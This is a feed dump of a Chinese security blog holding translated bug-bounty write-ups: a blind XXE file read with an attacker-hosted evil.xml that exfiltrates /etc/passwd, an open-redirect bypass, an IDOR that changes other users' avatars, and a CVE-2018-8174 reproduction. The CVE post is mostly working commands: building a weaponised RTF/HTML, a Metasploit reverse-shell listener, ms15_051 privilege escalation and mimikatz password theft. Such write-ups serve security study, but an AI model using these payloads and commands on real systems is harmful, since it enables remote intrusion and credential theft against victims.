<h4 id="emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来"><a href="#emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来" class="headerlink" title="&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来"></a>&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来</h4><h4 id="emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是："><a href="#emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是：" class="headerlink" title="&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是："></a>&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">[…]</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"><a href="#emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容" class="headerlink" title="&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"></a>&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容</h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/16.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
<h4 id="emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制"><a href="#emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制" class="headerlink" title="&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制"></a>&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制</h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;:%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/17.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：From-blind-XXE-to-root-level-file-read-access&quot;&gt;&lt;a href=&quot;#原文：From-blind-XXE-to-root-level-file-read-access&quot; class=&quot;headerlink&quot; title=&quot;原文：From blind XXE to root-level file read access&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;From blind XXE to root-level file read access&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：Blind-XXE&quot;&gt;&lt;a href=&quot;#漏洞：Blind-XXE&quot; class=&quot;headerlink&quot; title=&quot;漏洞：Blind XXE&quot;&gt;&lt;/a&gt;漏洞：Blind XXE&lt;/h4&gt;&lt;h4 id=&quot;作者：Pieter&quot;&gt;&lt;a href=&quot;#作者：Pieter&quot; class=&quot;headerlink&quot; title=&quot;作者：Pieter&quot;&gt;&lt;/a&gt;作者：Pieter&lt;/h4&gt;&lt;h4 id=&quot;难度：高&quot;&gt;&lt;a href=&quot;#难度：高&quot; class=&quot;headerlink&quot; title=&quot;难度：高&quot;&gt;&lt;/a&gt;难度：高&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第二篇翻译：URL重定向</title>
    <link href="http://TimeS0ng.github.io/2018/12/19/%E7%AC%AC%E4%BA%8C%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ADevelopers-are-lazy-or-maybe-busy/"/>
    <id>http://TimeS0ng.github.io/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/</id>
    <published>2018-12-19T09:35:11.000Z</published>
    <updated>2019-01-25T01:06:30.982Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Developers-are-lazy-or-maybe-busy"><a href="#原文：Developers-are-lazy-or-maybe-busy" class="headerlink" title="原文：Developers are lazy(or maybe busy)"></a>原文：<a href="https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4" target="_blank" rel="external">Developers are lazy(or maybe busy)</a></h4><h4 id="漏洞：-符绕过造成URL重定向"><a href="#漏洞：-符绕过造成URL重定向" class="headerlink" title="漏洞：@符绕过造成URL重定向"></a>漏洞：@符绕过造成URL重定向</h4><h4 id="作者：KatsuragiCSL"><a href="#作者：KatsuragiCSL" class="headerlink" title="作者：KatsuragiCSL"></a>作者：KatsuragiCSL</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"><a href="#emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！" class="headerlink" title="&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"></a>&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！</h4><h4 id="emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："><a href="#emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：" class="headerlink" title="&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："></a>&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.example.com/account/login?next=https://www.example.com</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！"><a href="#emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！" class="headerlink" title="&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！"></a>&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！</h4><h4 id="emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！"><a href="#emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！" class="headerlink" title="&emsp;&emsp;首先，我尝试了最常规的payload：https://www.example.com/account/login?next=https://google.com   遗憾的是这个payload并没有生效，我没有被重定向到Google去！"></a>&emsp;&emsp;首先，我尝试了最常规的payload：<a href="https://www.example.com/account/login?next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://google.com</a>   遗憾的是这个payload并没有生效，我没有被重定向到Google去！</h4><h4 id="emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用"><a href="#emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用" class="headerlink" title="&emsp;&emsp;然后，我又尝试另一个payload：https://www.example.com/account/login?next=https://example.com@google.com , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用"></a>&emsp;&emsp;然后，我又尝试另一个payload：<a href="https://www.example.com/account/login?next=https://example.com@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://example.com@google.com</a> , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用</h4><h4 id="emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误"><a href="#emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误" class="headerlink" title="&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https://example.com%2Cgoogle.com 并且浏览器还提示错误"></a>&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com</a> 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：<a href="https://example.com%2Cgoogle.com" target="_blank" rel="external">https://example.com%2Cgoogle.com</a> 并且浏览器还提示错误</h4><h4 id="emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已"><a href="#emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已" class="headerlink" title="&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已"></a>&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已</h4><h4 id="emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com"><a href="#emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com" class="headerlink" title="&emsp;&emsp;所以我又构造了最终的payload：https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com"></a>&emsp;&emsp;所以我又构造了最终的payload：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com</a></h4><h4 id="emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看"><a href="#emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看" class="headerlink" title="&emsp;&emsp;并且得到URL：https://example.com,@google.com 这其实就已经将我重定向到https://www.google.com了，不信你可以访问看看"></a>&emsp;&emsp;并且得到URL：<a href="https://example.com,@google.com" target="_blank" rel="external">https://example.com,@google.com</a> 这其实就已经将我重定向到<a href="https://www.google.com了，不信你可以访问看看" target="_blank" rel="external">https://www.google.com了，不信你可以访问看看</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_2/1.gif" alt=""></p>
<h4 id="emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…"><a href="#emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…" class="headerlink" title="&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…."></a>&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词….</h4><h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Developers-are-lazy-or-maybe-busy&quot;&gt;&lt;a href=&quot;#原文：Developers-are-lazy-or-maybe-busy&quot; class=&quot;headerlink&quot; title=&quot;原文：Developers are lazy(or maybe busy)&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Developers are lazy(or maybe busy)&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：-符绕过造成URL重定向&quot;&gt;&lt;a href=&quot;#漏洞：-符绕过造成URL重定向&quot; class=&quot;headerlink&quot; title=&quot;漏洞：@符绕过造成URL重定向&quot;&gt;&lt;/a&gt;漏洞：@符绕过造成URL重定向&lt;/h4&gt;&lt;h4 id=&quot;作者：KatsuragiCSL&quot;&gt;&lt;a href=&quot;#作者：KatsuragiCSL&quot; class=&quot;headerlink&quot; title=&quot;作者：KatsuragiCSL&quot;&gt;&lt;/a&gt;作者：KatsuragiCSL&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第一篇翻译：越权漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/19/%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AChange-Anyone%E2%80%99s-profile-picture-Exploiting-IDOR/"/>
    <id>http://TimeS0ng.github.io/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/</id>
    <published>2018-12-19T02:13:22.000Z</published>
    <updated>2019-01-25T01:09:54.200Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Change-Anyone’s-profile-picture-Exploiting-IDOR"><a href="#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR" class="headerlink" title="原文：Change Anyone’s profile picture-Exploiting IDOR"></a>原文：<a href="https://medium.com/@rupika.luhach/change-anyones-profile-picture-exploiting-idor-41369f5acf75" target="_blank" rel="external">Change Anyone’s profile picture-Exploiting IDOR</a></h4><h4 id="漏洞：未授权更改用户信息"><a href="#漏洞：未授权更改用户信息" class="headerlink" title="漏洞：未授权更改用户信息"></a>漏洞：未授权更改用户信息</h4><h4 id="作者：Rupika-Luhach"><a href="#作者：Rupika-Luhach" class="headerlink" title="作者：Rupika Luhach"></a>作者：Rupika Luhach</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="Hello-Guys"><a href="#Hello-Guys" class="headerlink" title="Hello Guys!!"></a>Hello Guys!!</h2><h4 id="emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"><a href="#emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！" class="headerlink" title="&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"></a>&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！</h4><h2 id="IDOR漏洞："><a href="#IDOR漏洞：" class="headerlink" title="IDOR漏洞："></a>IDOR漏洞：</h2><h4 id="emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"><a href="#emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。" class="headerlink" title="&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"></a>&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。</h4><h4 id="上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"><a href="#上面是专业解释，看完接下来的漏洞复现流程自然就懂了！" class="headerlink" title="[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"></a>[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！</h4><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><h4 id="emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者"><a href="#emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者" class="headerlink" title="&emsp;&emsp;1. 首先我创建了两个账号，Rupika Luhach 作为攻击者账号，Test User 充当受害者"></a>&emsp;&emsp;1. 首先我创建了两个账号，<strong>Rupika Luhach</strong> 作为攻击者账号，<strong>Test User</strong> 充当受害者</h4><h4 id="emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85"><a href="#emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85" class="headerlink" title="&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85"></a>&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/1.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/2.png" alt=""></p>
<h4 id="emsp-emsp"><a href="#emsp-emsp" class="headerlink" title="&emsp;&emsp;"></a>&emsp;&emsp;</h4><h4 id="emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85"><a href="#emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85" class="headerlink" title="&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85"></a>&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/3.png" alt=""></p>
<h4 id="emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了"><a href="#emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了" class="headerlink" title="&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了"></a>&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了</h4><h4 id="初始头像"><a href="#初始头像" class="headerlink" title="[*] 初始头像"></a>[*] 初始头像</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/4.png" alt=""></p>
<h4 id="篡改后的头像"><a href="#篡改后的头像" class="headerlink" title="[*] 篡改后的头像"></a>[*] 篡改后的头像</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/5.png" alt=""></p>
<h2 id="视屏演示："><a href="#视屏演示：" class="headerlink" title="视屏演示："></a>视屏演示：</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_1/videoplayback.mp4" type="video/mp4"><br></video>

<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Change-Anyone’s-profile-picture-Exploiting-IDOR&quot;&gt;&lt;a href=&quot;#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR&quot; class=&quot;headerlink&quot; title=&quot;原文：Change Anyone’s profile picture-Exploiting IDOR&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@rupika.luhach/change-anyones-profile-picture-exploiting-idor-41369f5acf75&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Change Anyone’s profile picture-Exploiting IDOR&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：未授权更改用户信息&quot;&gt;&lt;a href=&quot;#漏洞：未授权更改用户信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞：未授权更改用户信息&quot;&gt;&lt;/a&gt;漏洞：未授权更改用户信息&lt;/h4&gt;&lt;h4 id=&quot;作者：Rupika-Luhach&quot;&gt;&lt;a href=&quot;#作者：Rupika-Luhach&quot; class=&quot;headerlink&quot; title=&quot;作者：Rupika Luhach&quot;&gt;&lt;/a&gt;作者：Rupika Luhach&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-8174 漏洞复现</title>
    <link href="http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-漏洞复现/</id>
    <published>2018-06-27T13:24:22.000Z</published>
    <updated>2019-01-25T01:15:34.091Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。"><a href="#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。" class="headerlink" title="&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。"></a>&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。</h4><a id="more"></a>
<h2 id="0x01-操作演示"><a href="#0x01-操作演示" class="headerlink" title="0x01. 操作演示"></a>0x01. 操作演示</h2><h4 id="1-下载EXP到kali-，生成木马文件，启动msf监听"><a href="#1-下载EXP到kali-，生成木马文件，启动msf监听" class="headerlink" title="1. 下载EXP到kali ，生成木马文件，启动msf监听"></a>1. 下载EXP到kali ，生成木马文件，启动msf监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git</div><div class="line">cd CVE-2018-8174_EXP/</div><div class="line">python CVE-2018-8174.py -u http://192.168.1.111/exploit.html -o exploit.rtf -i 192.168.1.111 -p 4444</div><div class="line">cp exploit.html /var/www/html/</div><div class="line">service apache2 start</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/shell/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">set lport 4444</div><div class="line">run</div></pre></td></tr></table></figure>
<h4 id="2-靶机访问-http-192-168-1-111-exploit-html"><a href="#2-靶机访问-http-192-168-1-111-exploit-html" class="headerlink" title="2. 靶机访问 http://192.168.1.111/exploit.html"></a>2. 靶机访问 <a href="http://192.168.1.111/exploit.html" target="_blank" rel="external">http://192.168.1.111/exploit.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg" alt=""></p>
<h4 id="3-先将-shell-转换为-meterpreter-，再利用ms15-051提权"><a href="#3-先将-shell-转换为-meterpreter-，再利用ms15-051提权" class="headerlink" title="3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权"></a>3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sessions -u 2</div><div class="line">use windows/local/ms15_051_client_copy_image</div><div class="line">set session 3</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627211559_Tkq5fo_Screenshot.jpeg" alt=""></p>
<h4 id="4-利用mimikatz-盗取明文密码"><a href="#4-利用mimikatz-盗取明文密码" class="headerlink" title="4. 利用mimikatz 盗取明文密码"></a>4. 利用mimikatz 盗取明文密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
